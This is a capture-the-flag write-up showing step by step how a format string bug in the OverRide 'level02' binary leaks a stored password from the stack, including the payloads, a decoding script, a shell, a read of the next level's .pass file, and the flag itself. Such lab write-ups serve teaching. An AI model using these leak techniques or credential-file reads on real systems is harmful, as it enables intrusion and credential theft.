# **Level02**

At this level (level02), I found a binary file that, when executed, prompts the user for a username and password.

```nasm
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: eeeeee
--[ Password: eee
*****************************************
eeeeee does not have access!
level02@OverRide:~$
```

## **Binary Analysis**

After examining the program with GDB, I found that the program reads the password from a file, takes the username and password input from the user, and compares them. If the password is correct, it spawns a shell.

```nasm

0x0000000000400814 <+0>:     push   %rbp
0x0000000000400818 <+4>:     sub    $0x120,%rsp      ;Allocate 288 bytes

;Initialize buffers at different offsets
0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx  ; Username buffer
0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx  ; File content buffer
0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx ; Password buffer

;Open password file
0x00000000004008a8 <+148>:   callq  0x400700 <fopen@plt>
0x00000000004008ad <+153>:   mov    %rax,-0x8(%rbp)   ; Store file pointer

;Read from file
0x00000000004008f4 <+224>:   mov    $0x29,%edx        ; Read 41 bytes (0x29)
0x0000000000400901 <+237>:   callq  0x400690 <fread@plt>

;Username input
0x00000000004009d1 <+445>:   mov    $0x64,%esi        ; Size = 100 bytes
0x00000000004009d9 <+453>:   callq  0x4006f0 <fgets@plt>

;Password input
0x0000000000400a17 <+515>:   mov    $0x64,%esi        ; Size = 100 bytes
0x0000000000400a1f <+523>:   callq  0x4006f0 <fgets@plt>

; Format string vulnerability
0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax  ; Load username
0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt> ; Direct printf

;spawning a shell
0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>
```

## **Vulnerability**

The vulnerability in this program is a format string vulnerability. The input is passed directly to `printf` without proper validation.

```nasm
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p%p
--[ Password:
*****************************************
0x7fffffffe4c0(nil) does not have access!
level02@OverRide:~$
```

## **Exploit**

Now, we need to calculate the offset. First, we determine the distance between the buffers.

```nasm
(gdb) p/d 0x70
$1 = 112
(gdb) p/d 0xa0
$2 = 160
```

Visual representation:

```nasm
Higher addresses
[      ...      ]
rbp-112 (0x70)  Username buffer
[      ...      ]
48 bytes difference
[      ...      ]
rbp-160 (0xa0)  Password buffer
[      ...      ]
Lower addresses
```

Calculating the Distance:

                                           *Distance = 160 − 112 = 48 bytes*

Since this is a 64-bit binary (x86_64), where registers, memory addresses, and stack values are 8 bytes each, we determine the number of positions to move:

                                           *48 ÷ 8 = 6 positions*

This means we need to go back **6 positions** on the stack to reach the password buffer.

1. **Find the Start Position** 

```nasm
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password:
*****************************************
AAAAAAAA 0x7fffffffe4c0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6b8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x4141414141414141 0x2520702520702520 0x2070252070252070 does not have access!
level02@OverRide:~$

```

2. **We can verify this with specific position:**

```nasm
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA %28$p
--[ Password:
*****************************************
AAAA 0x3832252041414141 ; Confirms position 28
level02@OverRide:~$ 
```

So the first password position: 28 - 6 = 22

1. **Precise Format String:**

```bash
# Read 5 8-byte chunks starting at position 22
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password:
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
level02@OverRide:~$
```

1. **Decode Password:**
Hex to ASCII conversion
```python
hex_values = [
    '756e505234376848',  # First chunk
    '45414a3561733951',  # Second chunk
    '377a7143574e6758',  # Third chunk
    '354a35686e475873',  # Fourth chunk
    '48336750664b394d'   # Fifth chunk
]

password = ''
for hex_val in hex_values:
    # 1. bytes.fromhex(hex_val):
    # '756e505234376848' -> b'unPR47hH'
    
    # 2. [::-1]:
    # b'unPR47hH' -> b'Hh74RPnu'
    
    # 3. decode('ascii'):
    # b'Hh74RPnu' -> 'Hh74RPnu'
    
    bytes_val = bytes.fromhex(hex_val)
    password += bytes_val[::-1].decode('ascii')

print(password)
```

**Output:** 

```python
~ python3 decode.py
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
➜  ~
```

1. **Get the Flag**

```python
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: dddddd
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, dddddd!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
$
```

## Flag

```python
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```